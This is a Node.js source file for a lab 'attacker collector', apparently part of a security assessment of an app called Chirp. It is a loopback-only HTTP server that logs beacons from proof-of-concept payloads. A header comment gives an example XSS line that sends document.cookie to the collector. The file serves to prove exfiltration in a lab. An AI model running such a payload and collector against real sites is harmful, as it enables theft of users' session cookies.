// -----------------------------------------------------------------------------
// Attacker collector (report §4.6, §6.3). A tiny listener that records beacons
// sent by proof-of-concept payloads so exfiltration can be *proven* without
// touching any external system. Lab-only; bound to loopback in docker-compose.
//
// A payload might do, from inside the victim page:
//   new Image().src = 'http://127.0.0.1:9000/collect?c=' + encodeURIComponent(document.cookie)
// and this server logs whatever arrives.
// -----------------------------------------------------------------------------
import http from 'node:http';

const PORT = 9000;
const hits = [];

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (url.pathname === '/collect') {
    const record = {
      time: new Date().toISOString(),
      ip: req.socket.remoteAddress,
      query: Object.fromEntries(url.searchParams.entries()),
      ua: req.headers['user-agent'] || '',
      referer: req.headers['referer'] || '',
    };
    hits.push(record);
    console.log('[collector] BEACON', JSON.stringify(record));
    // 1x1 transparent GIF so <img> payloads render without error.
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, { 'Content-Type': 'image/gif', 'Access-Control-Allow-Origin': '*' });
    return res.end(gif);
  }

  if (url.pathname === '/log') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(hits, null, 2));
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end(`Chirp lab collector. ${hits.length} beacon(s) captured. GET /log to view.\n`);
});

server.listen(PORT, () => console.log(`[collector] listening on :${PORT}`));
